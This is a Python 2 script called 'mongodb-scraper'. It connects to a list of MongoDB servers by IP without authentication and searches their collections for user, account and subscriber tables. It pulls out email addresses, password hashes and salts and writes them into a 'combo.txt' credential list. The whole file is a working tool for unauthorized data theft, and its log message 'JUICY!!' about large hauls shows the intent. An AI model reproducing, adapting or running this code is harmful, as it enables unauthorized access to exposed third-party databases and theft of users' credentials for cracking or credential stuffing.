# coding=utf-8
import logging
import json
import re
from colorlog import ColoredFormatter
from pymongo import MongoClient
import io


def scrape():
    mongo_logger = logging.getLogger('mongodb-scraper')
    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s|%(levelname)-8s| %(message)s',
                        datefmt='%Y-%m-%d %H:%M:%S',
                        filename='mongodb-scraper.log')

    console = logging.StreamHandler()
    console.setLevel(logging.INFO)

    formatter = ColoredFormatter("%(log_color)s[%(levelname)-4s] %(message)s%(reset)s")
    console.setFormatter(formatter)
    mongo_logger.addHandler(console)

    mongo_logger.info("Opening data")

    email_regex = re.compile(r'[a-z0-9\-\._]+@[a-z0-9\-\.]+\.[a-z]{2,4}')

    try:
        with open('data.json', 'r') as data_json:
            ips = json.load(data_json)
    except (IOError, ValueError):
        print "Please provide a valid JSON encoded file in data.json"
        return

    mongo_logger.info("Found " + str(len(ips)) + " IPs to connect")

    try:
        with open('processed.json', 'r') as processed_json:
            processed = json.load(processed_json)
    except (IOError, ValueError):
        # Meh, I'll live with that...
        processed = []

    if processed:
        mongo_logger.info("Found " + str(len(processed)) + " already processed IP")

    table_names = ['account', 'user', 'subscriber']
    column_names = ['pass', 'pwd']

    for ip in ips:
        # Do I have already processed this IP?
        if ip in processed:
            continue

        mongo_logger.info("Connecting to " + ip)

        try:
            client = MongoClient(ip, connectTimeoutMS=5000)
            dbs = client.database_names()
        except (KeyboardInterrupt, SystemExit):
            return
        except:
            mongo_logger.warning("An error occurred while connecting to " + ip + ". Skipping")
            # Don't cry if we can't connect to the server
            processed.append(ip)
            continue

        mongo_logger.debug("Database found: " + ', '.join(dbs))

        for db in dbs:
            # Skip local system databases
            if db in ['admin', 'local']:
                continue

            o_db = client[db]

            try:
                collections = o_db.collection_names()
            except (KeyboardInterrupt, SystemExit):
                return
            except Exception:
                # Don't cry if something bad happens
                mongo_logger.warning("\tAn error occurred while fetching collections from " + ip + ". Skipping.")
                break

            for collection in collections:
                mongo_logger.debug("\t\tAnalyzing collection: " + collection)
                # Is this a collection I'm interested into?
                if not any(table in collection for table in table_names):
                    continue

                o_coll = o_db[collection]

                try:
                    row = o_coll.find_one()
                except:
                    # Sometimes the collection is broken, let's skip it
                    continue

                interesting = False

                # If the collection is empty I get a null row
                if row:
                    for key, value in row.iteritems():
                        # Is that a column we're interested into?
                        if any(column in key for column in column_names):
                            # Only consider plain strings, nothing fancy
                            if isinstance(value, basestring):
                                interesting = True
                                break

                # This collection has no interesting data? Let's skip it
                if not interesting:
                    continue

                mongo_logger.info("Table with interesting data found")

                # Ok there is interesting data inside it. Let's find if there is an email address, too
                # I'll just check the first record and hope there is something similar to an email address.
                email_field = ''

                for key, value in row.iteritems():
                    # If we find anything that resemble an email address, let's store it
                    if isinstance(value, basestring):
                        if re.match(email_regex, value.encode('utf-8')):
                            email_field = key
                            break

                rows = o_coll.find()
                total = rows.count()

                if total > 750:
                    mongo_logger.info("***FOUND COLLECTION WITH  " + str(total) + "  RECORDS. JUICY!!")

                lines = []

                for row in rows:
                    try:
                        email = row[email_field]
                        if not email:
                            email = ''
                    except:
                        email = ''

                    for key, value in row.iteritems():
                        try:
                            # Is that a column we're interested into?
                            if any(column in key for column in column_names):
                                # Skip empty values
                                if not value:
                                    continue

                                # Skip fields that are not strings (ie reset_pass_date => datetime object)
                                if not isinstance(value, basestring):
                                    continue

                                # Try to fetch the salt, if any
                                try:
                                    salt = row['salt'].encode('utf-8')
                                    if not salt:
                                        salt = ''
                                except:
                                    salt = ''

                                value = value.encode('utf-8') + ':' + salt

                                lines.append(unicode(ip.encode('utf-8') + '|' + email + ':' + value + '\n'))
                        except UnicodeDecodeError:
                            # You know what? I'm done dealing with all those crazy encodings
                            mongo_logger.warn("An error occurred while encoding the string. Skipping")
                            continue

                    # If I get a very long list, let's write it in batches
                    if len(lines) >= 1000:
                        mongo_logger.info("\t\tFetched more than 1000 records, dumping them to file")
                        with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
                            fp_pass.writelines(lines)
                            lines = []

                with io.open('data/combo.txt', 'a', encoding='utf-8') as fp_pass:
                    fp_pass.writelines(lines)

        client.close()
        processed.append(ip)
        with open('processed.json', 'w') as processed_json:
            json.dump(processed, processed_json)

if __name__ == '__main__':
    scrape()
